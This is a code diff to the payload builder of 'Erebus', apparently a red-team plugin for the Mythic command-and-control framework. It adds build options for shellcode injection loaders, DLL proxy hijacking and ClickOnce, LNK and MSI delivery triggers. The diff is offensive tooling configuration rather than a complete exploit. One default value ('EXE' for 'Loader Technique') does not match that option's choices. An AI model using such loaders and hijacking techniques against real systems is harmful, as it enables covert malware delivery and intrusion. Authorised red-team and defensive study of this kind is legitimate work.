@@ -102,28 +102,68 @@ Erebus comes with multiple techniques out of the box to craft complex chains, an
     agent_code_path = agent_path / "agent_code"
 
     build_parameters = [
-    #     BuildParameter(
-    #         name = "Architecture",
-    #         parameter_type = BuildParameterType.ChooseOne,
-    #         description = "Select Architecture.",
-    #         choices = ["x64", "x86"],
-    #         default_value = "x64",
-    #         hide_conditions = [
-    #             HideCondition(name="Shellcode Format", operand=HideConditionOperand.EQ, value="Raw")
-    #         ]
-    #     ),
+        BuildParameter(
+            name = "Main Payload Type",
+            parameter_type = BuildParameterType.ChooseOne,
+            description = """Select the main payload type (Shellcode Loader or DLL Hijack)
+NOTE: The shellcode loader is written in C# - Supplied shellcode format must be in the same language.
+NOTE: DLL Hijack Loader is written in C++.
+""",
+            choices = ["Loader", "Hijack"],
+            default_value="Loader",
+            hide_conditions = [
+                HideCondition(name="Shellcode Format", operand=HideConditionOperand.NotEQ, value="C"),
+            ]
+        ),
+
+        BuildParameter(
+            name = "Loader Format",
+            parameter_type = BuildParameterType.ChooseOne,
+            description = "Select the loader's filetype.",
+            choices = ["EXE", "DLL", "Service"],
+            default_value = "EXE",
+            hide_conditions = [
+                HideCondition(name="Main Payload Type", operand=HideConditionOperand.NotEQ, value="Loader"),
+                # Change this if you are using a custom Loader written in another language
+                HideCondition(name="Shellcode Format", operand=HideConditionOperand.NotEQ, value="CSharp"),
+            ]
+        ),
+
+        BuildParameter(
+            name = "Loader Technique",
+            parameter_type = BuildParameterType.ChooseOne,
+            description = "Select the loader's payload execution.",
+            choices = ["Shellcode Injection", "ClickOnce Application"],
+            default_value = "EXE",
+            hide_conditions = [
+                HideCondition(name="Main Payload Type", operand=HideConditionOperand.NotEQ, value="Loader"),
+                # Change this if you are using a custom Loader written in another language
+                HideCondition(name="Shellcode Format", operand=HideConditionOperand.NotEQ, value="CSharp"),
+            ]
+        ),
 
         BuildParameter(
             name = "DLL Hijacking",
             parameter_type = BuildParameterType.File,
             description = """Prepares a given DLL for proxy-based hijacking.
 NOTE: Shellcode Format must be set to C.
-NOTE: Only supports XOR for now.
-NOTE: Does not (currently) support encoded or compressed payloads.
+NOTE: Only supports XOR for now. Does not (currently) support encoded or compressed payloads.
 """,
             hide_conditions = [
+                HideCondition(name="Main Payload Type", operand=HideConditionOperand.EQ, value="Loader"),
                 # Change this if you are using a custom DLL Loader written in another language
                 HideCondition(name="Shellcode Format", operand=HideConditionOperand.NotEQ, value="C"),
+            ]
+        ),
+
+        BuildParameter(
+            name = "Trigger Type",
+            parameter_type = BuildParameterType.ChooseOne,
+            description = "Choose a command to run when the trigger is executed.",
+            choices = ["ClickOnce", "LNK", "MSI"],
+            default_value = "ClickOnce",
+            hide_conditions = [
+                HideCondition(name="Shellcode Format", operand=HideConditionOperand.EQ, value="Raw")
             ]
         ),
 
@@ -180,7 +220,7 @@ NOTE: Does not (currently) support encoded or compressed payloads.
             name = "Encryption Key",
             parameter_type = BuildParameterType.String,
             description = """Choose an encryption key. A random one will be
-            generated if none have been entered.""",
+generated if none have been entered.""",
             default_value="NONE"
         ),
 
@@ -333,9 +373,6 @@ NOTE: Does not (currently) support encoded or compressed payloads.
             shellcrypt_path = PurePath(agent_build_path) / "shellcrypt" / "shellcrypt.py"
             shellcrypt_path = str(shellcrypt_path)
 
-            payload_path = PurePath(agent_build_path) / "payload" / "payload.dll"
-            payload_path = str(payload_path)
-
             templates_path = PurePath(agent_build_path) / "templates"
             dll_hijack_template_path = templates_path / "dll_template.cpp"
             dll_target_path = templates_path / "dll_target.dll"
@@ -430,6 +467,7 @@ NOTE: Does not (currently) support encoded or compressed payloads.
                     response.status = BuildStatus.Success
                     response.build_message = "Shellcode Generated!"
                     response.build_stdout = output + "\n" + obfuscated_shellcode_path
+                    response.updated_filename = "erebus_wrapper.bin"
                     await SendMythicRPCPayloadUpdatebuildStep(MythicRPCPayloadUpdateBuildStepMessage(
                         PayloadUUID=self.uuid,
                         StepName="Shellcode Obfuscation",
@@ -475,10 +513,22 @@ NOTE: Does not (currently) support encoded or compressed payloads.
                 agentFileId=self.get_parameter("DLL Hijacking")
             )
 
+            file_name_resp = await SendMythicRPCFileSearch(MythicRPCFileSearchMessage(
+                AgentFileID=self.get_parameter("DLL Hijacking")
+            ))
+
+            dll_file_name = ""
+            if file_name_resp.Success:
+                if len(file_name_resp.Files) > 0:
+                    dll_file_name = file_name_resp.Files[0].Filename
+
+            payload_path = PurePath(agent_build_path) / "payload" / dll_file_name
+            payload_path = str(payload_path)
+
             with open(dll_target_path, "wb") as file:
                 file.write(file_content)
 
-            exports = await generate_proxies(dllfile=dll_target_path)
+            exports = await generate_proxies(dll_file=dll_target_path, dll_file_name=dll_file_name)
 
             with open(obfuscated_shellcode_path, "r") as file:
                 shellcode_content = file.read()
